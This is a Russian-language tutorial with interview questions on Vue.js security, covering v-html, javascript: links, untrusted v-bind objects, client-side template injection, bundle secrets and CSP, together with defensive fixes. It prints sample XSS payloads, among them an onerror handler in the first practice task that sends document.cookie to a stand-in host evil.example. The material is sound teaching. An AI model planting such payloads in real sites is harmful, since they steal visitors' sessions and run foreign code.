# Безопасность

Где Vue защищает от XSS сам и где защита — твоя задача: экранирование интерполяции, `v-html`, адреса в `:href`, атрибуты из чужих данных, компиляция пользовательских шаблонов, секреты в бандле и CSP. Спрашивают, как Vue защищает от XSS, чем опасен `v-html` и можно ли хранить ключи API во фронтенде. Глубже — почему `javascript:` в `:href` проходит, чем опасен `v-bind` с объектом от пользователя и почему шаблон из пользовательского текста — это выполнение кода.

::tldr
- **Интерполяция и привязки атрибутов экранируются**, и на клиенте, и при SSR: строка с HTML показывается как текст. Это закрывает большинство XSS в шаблонах.
- **`v-html` вставляет HTML как есть.** Пользовательский HTML пропускают через DOMPurify, иначе `<img onerror>` выполнит код.
- **Vue не проверяет протокол в `:href` и `:src`:** `javascript:alert(1)` попадёт в атрибут. Адреса от пользователя проверяют сами — разрешают только `https:` и `http:`.
- **Пользовательский текст нельзя превращать в шаблон:** выражения `{{ }}` в нём выполнятся как код. И `v-bind="userAttrs"` разрешает чужие `onclick` и `style`.
- **Всё, что попало в бандл, публично,** включая переменные `VITE_*`. Секреты живут на сервере, а клиентские проверки прав — это удобство интерфейса, а не защита.
::

## Что Vue экранирует сам

XSS — внедрение чужого скрипта в страницу. Общий разбор: виды XSS, контексты экранирования, санитизация, :term[CSP]{def="Content Security Policy: правила, откуда странице можно загружать и выполнять код"} — в [XSS](/content/security-perfomance/xss). Здесь — что из этого делает Vue.

Сквозной пример — карточка продавца на маркетплейсе: имя, описание, ссылка на сайт. Всё это вводит продавец, то есть данные **чужие**.

```vue
<template>
  <h3>{{ seller.name }}</h3>
  <p :title="seller.slogan">{{ seller.about }}</p>
</template>
```

`{{ }}` выводит текст через `textContent`, а привязки атрибутов — через `setAttribute`. Ни то, ни другое не разбирается как HTML. При SSR те же значения экранируются в строке HTML: в проверке `<img src=x onerror="alert(1)">` превратился в `&lt;img src=x onerror=&quot;alert(1)&quot;&gt;`, а кавычка в атрибуте — в `&quot;`.

Это закрывает главный класс XSS в шаблонах. Остальное — места, где Vue сознательно делает то, что ты попросил.

## v-html

```vue
<div v-html="seller.about"></div>
```

`v-html` записывает строку в `innerHTML`. Если в ней `<img src=x onerror="…">`, браузер создаст элемент и выполнит обработчик. Теги `<script>` через `innerHTML` не выполняются, но обработчиков событий в атрибутах достаточно. В проверке у элемента, вставленного через `v-html`, атрибут `onerror` остался на месте.

Правила:

1. **Не использовать `v-html` для чужих данных, если без него можно обойтись.** Форматированный текст часто хранят как Markdown или структуру и рисуют компонентами.
2. **Если HTML нужен — очищать.** DOMPurify удаляет опасные теги и атрибуты и оставляет разметку:

```js
import DOMPurify from 'dompurify';

const safeAbout = computed(() => DOMPurify.sanitize(seller.value.about));
```

В проверке после очистки `onerror` пропал, а `<b>` остался. Очищают на клиенте прямо перед вставкой — данные могли измениться по пути. В браузерах появляется встроенная альтернатива — Sanitizer API и `setHTML`.

3. **Сторонние Markdown-рендереры** выдают HTML, и его тоже очищают перед `v-html`.

`v-html` на компоненте не работает как слот: он заменяет содержимое элемента и не компилируется как шаблон — и это хорошо.

## Адреса в атрибутах

```vue
<a :href="seller.site">Сайт продавца</a>
```

Экранирование защищает от выхода из атрибута, но не от **опасного значения**. Строка `javascript:alert(document.cookie)` — корректный адрес, и Vue записывает его в `href` без изменений. В проверке атрибут содержал именно его. Клик выполнит код в контексте сайта. В отличие от React 19, который блокирует `javascript:`-адреса в `href`, Vue этого не делает (подробно — в [Безопасности React](/content/reactjs/security)).

Адреса от пользователя проверяют по протоколу:

```js
function safeUrl(value) {
  try {
    const { protocol } = new URL(value, location.origin);
    return protocol === 'https:' || protocol === 'http:' ? value : '#';
  } catch {
    return '#';
  }
}
```

`new URL` нормализует хитрые формы вроде ` JaVaScRiPt:` с пробелами и регистром — в проверке они отсеялись, а `https://` и относительные пути прошли. Проверка по `startsWith('javascript:')` такие формы пропускает. То же касается `:src` у `iframe` и `data:`-адресов.

## Атрибуты из чужого объекта

`v-bind` с объектом раскладывает его на атрибуты (подробно — в [Шаблонах и директивах](/content/vuejs/templates-and-directives)). Если объект пришёл извне — из настроек виджета, из :term[CMS]{def="система управления контентом: админка, где редакторы правят страницы без кода"}, из параметров встраивания, — пользователь решает, какие атрибуты появятся:

```vue
<button v-bind="widget.attrs">Купить</button>
<!-- widget.attrs = { onclick: 'alert(1)', style: 'position:fixed;inset:0' } -->
```

Строковый `onclick` Vue запишет как обычный атрибут, и браузер выполнит его как встроенный обработчик. `style` растянет кнопку на весь экран, и любой клик по странице станет кликом по ней. Оба атрибута в проверке оказались на кнопке. Чужие атрибуты фильтруют по белому списку: только `aria-*`, `data-*` и конкретные разрешённые имена.

## Пользовательский текст как шаблон

Самая специфичная для Vue уязвимость. Шаблон — это код: компилятор превращает выражения в `{{ }}` в JavaScript, который выполняется в браузере. Если вставить пользовательский текст **в шаблон**, а не передать его **данными**, его выражения выполнятся:

```js
// описание продавца — «Привет {{ ''.constructor.constructor('return 6 * 7')() }}»
defineComponent({ template: `<p>${seller.about}</p>` });   // выполнится, покажет «Привет 42»
defineComponent({ props: ['about'], template: '<p>{{ about }}</p>' });   // текст как есть
```

В проверке первый вариант вычислил выражение из пользовательских данных. Белый список глобальных объектов в шаблоне не спасает: через `constructor.constructor` выражение получает `Function` и выполняет что угодно.

Где это случается:

- **шаблон из строки с подстановкой данных** — как в примере;
- **монтирование Vue на HTML, отрендеренный сервером с пользовательскими данными.** Vue, подключённый к готовой странице, компилирует содержимое корня как шаблон. Если в комментарии посетителя есть `{{ … }}`, оно выполнится, хотя сервер экранировал HTML. Это шаблонная инъекция на стороне клиента. Защита — `v-pre` на блоках с пользовательским содержимым или монтирование только на элементы без чужих данных.

Правило простое: **шаблоны пишет разработчик, данные приходят через пропсы и переменные.**

### CSP

Компиляция шаблона в браузере — это `new Function(code)`: в проверке полная сборка содержит этот вызов, а сборка «только рантайм» — нет. Политика CSP без `'unsafe-eval'` запретит полную сборку. Поэтому приложения на Vite с предкомпилированными шаблонами совместимы со строгой CSP, а подключение Vue скриптом с шаблонами в HTML — нет (подробно о CSP — в [CSP и заголовках безопасности](/content/security-perfomance/csp-and-security-headers)).

## Секреты и клиентские проверки

**Всё в бандле публично.** Переменные окружения с префиксом `VITE_` встраиваются в код при сборке и видны любому, кто откроет DevTools. Приватные ключи API, секреты подписи, доступы к базе живут на сервере, а клиент обращается к своему серверу, который их использует (подробно — в [API и BFF](/content/architecture/api-and-bff)).

**Клиентские проверки — это интерфейс.** `v-if="user.isAdmin"` прячет кнопку, а `beforeEach` не пускает на страницу, но запрос к API можно отправить вручную. Права проверяет сервер на каждом запросе (подробно — в [Аутентификации и токенах](/content/security-perfomance/authentication-and-tokens)).

**SSR и состояние.** Состояние, которое сервер вставляет в HTML для гидратации, сериализуют с экранированием: строка `</script>` в данных пользователя закроет тег скрипта. Nuxt использует для этого `devalue` (подробно — в [Управлении состоянием](/content/vuejs/state-management)).

---

## Красные флаги в ответе

- **«Vue защищает от XSS, можно не думать».** Интерполяция экранируется, но `v-html`, адреса, чужие атрибуты и шаблоны из данных — нет.
- **«`v-html` безопасен, потому что `<script>` в `innerHTML` не выполняется».** Обработчики в атрибутах вроде `onerror` выполняются.
- **«Vue блокирует `javascript:` в ссылках».** Не блокирует, протокол проверяют сами.
- **«Шаблон с подставленным текстом пользователя — это просто разметка».** Выражения `{{ }}` в нём выполнятся как код.
- **«Ключ в `VITE_API_KEY` спрятан в переменной окружения».** Он встроен в бандл и публичен.

## Как спрашивают на собеседовании

::question
Как Vue защищает от XSS по умолчанию?

#answer
Интерполяция `{{ }}` выводит значение как текст, а привязки атрибутов — через `setAttribute`, без разбора HTML. При SSR те же значения экранируются в строке. Поэтому данные пользователя в шаблоне не превращаются в разметку.

#more
Защита не распространяется на `v-html`, на опасные значения атрибутов вроде `javascript:` в `href`, на атрибуты из чужого объекта через `v-bind` и на шаблоны, собранные из пользовательского текста. Дополнительный слой — CSP, с которой совместима сборка без компилятора шаблонов.
::

::question
Чем опасен v-html?

#answer
Он записывает строку в `innerHTML`, и браузер разберёт её как HTML. Теги `<script>` не выполнятся, но обработчики в атрибутах, например `<img onerror>`, — выполнятся.

#more
Для чужих данных `v-html` либо не используют — рисуют разметку компонентами, — либо очищают HTML через DOMPurify перед вставкой. Вывод Markdown-рендереров тоже очищают. Встроенная альтернатива — Sanitizer API с `setHTML`.
::

::question
Защищает ли Vue от javascript:-ссылок?

#answer
Нет. `:href="url"` экранирует значение внутри атрибута, но строку `javascript:alert(1)` записывает как есть, и клик выполнит код. В этом отличие от React 19, который такие адреса блокирует.

#more
Адреса от пользователя разбирают через `new URL` и разрешают только `https:` и `http:`. `new URL` нормализует хитрые формы с пробелами и регистром, которые пропустит проверка через `startsWith`. То же касается `:src` у `iframe` и `data:`-адресов.
::

::question
Какая XSS-опасность специфична для Vue?

#answer
Шаблонная инъекция: пользовательский текст попадает в шаблон, а не в данные. Компилятор выполнит выражения `{{ }}` из этого текста, и через `constructor.constructor` они доберутся до `Function`.

#more
Типичный случай — Vue, подключённый к странице, которую рендерит сервер с пользовательскими данными: содержимое корня компилируется как шаблон, даже если сервер экранировал HTML. Защита — не подставлять данные в шаблоны, `v-pre` на пользовательском содержимом и монтирование только на свои элементы.
::

::question
Можно ли хранить ключи API во Vue-приложении?

#answer
Нет, если ключ секретный. Всё, что попало в бандл, публично, включая переменные `VITE_*` — они встраиваются в код при сборке.

#more
Секретные ключи использует сервер или BFF, а клиент обращается к нему. Публичные ключи — например, для карт с ограничением по домену — допустимы. Клиентские проверки прав через `v-if` и навигационные хуки — это интерфейс, доступ к данным проверяет сервер.
::

::question
Почему опасен v-bind с объектом из настроек?

#answer
Объект раскладывается на атрибуты, и тот, кто его задаёт, может добавить строковый `onclick` — браузер выполнит его как встроенный обработчик — или `style`, который растянет элемент на весь экран.

#more
Чужие атрибуты фильтруют по белому списку: `aria-*`, `data-*` и явно разрешённые имена. Значения адресов в них проверяют отдельно. Это касается виджетов, настраиваемых из CMS, и параметров встраивания.
::

## Практика

::practice{title="Описание продавца с форматированием"}
Продавцы пишут описание с жирным текстом и списками, и его показывают так:

```vue
<div class="about" v-html="seller.about"></div>
```

Один продавец вставил `<img src=x onerror="fetch('https://evil.example/?c=' + document.cookie)">`.

#solution
`v-html` вставил HTML как есть, и браузер выполнил обработчик `onerror`. HTML нужно очистить перед вставкой:

```js
import DOMPurify from 'dompurify';

const safeAbout = computed(() =>
  DOMPurify.sanitize(seller.value.about, { ALLOWED_TAGS: ['b', 'i', 'ul', 'ol', 'li', 'p', 'br'] }),
);
```

```vue
<div class="about" v-html="safeAbout"></div>
```

Белый список тегов оставляет форматирование и убирает всё остальное, включая атрибуты-обработчики. Кражу cookie дополнительно закрывает флаг `HttpOnly`, а внешние запросы — CSP с `connect-src`. В проверке после DOMPurify атрибут `onerror` исчез, а `<b>` остался.
::

::practice{title="Ссылка на сайт продавца"}
```vue
<a :href="seller.site" target="_blank">Сайт продавца</a>
```

Продавец указал сайт `javascript:alert(document.cookie)`.

#solution
Vue записал строку в `href` без изменений, и клик выполнит код. Адрес проверяют по протоколу, а внешние ссылки открывают без доступа к нашему окну:

```js
function safeUrl(value) {
  try {
    const { protocol } = new URL(value, location.origin);
    return protocol === 'https:' || protocol === 'http:' ? value : '#';
  } catch {
    return '#';
  }
}
```

```vue
<a :href="safeUrl(seller.site)" target="_blank" rel="noopener noreferrer">Сайт продавца</a>
```

Проверять стоит и при сохранении на сервере, и при выводе: данные могли попасть в базу раньше, чем появилась проверка. `rel="noopener"` не даёт открытой странице управлять нашей вкладкой через `window.opener`. В проверке `safeUrl` отсеял и `javascript:`, и форму с пробелом и смешанным регистром, а `https://` пропустил.
::
